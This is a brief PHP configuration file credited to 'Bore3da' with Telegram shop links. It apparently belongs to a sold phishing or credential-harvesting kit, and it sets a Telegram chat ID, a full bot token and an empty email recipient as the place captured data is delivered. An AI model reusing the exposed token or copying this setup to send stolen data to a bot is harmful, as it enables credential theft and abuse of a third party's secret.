<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   SG 2024
 * Author      :   Bore3da

 * channel Telegram  :  https://t.me/bore3dashop
 */

// telegram

$chat_id = "-4266774548";
$bot_token = "6674883111:AAGb6PaJmVAp0-JeWVkFJdZo9SloD4lZ4S8";
// email
$to = '';


?>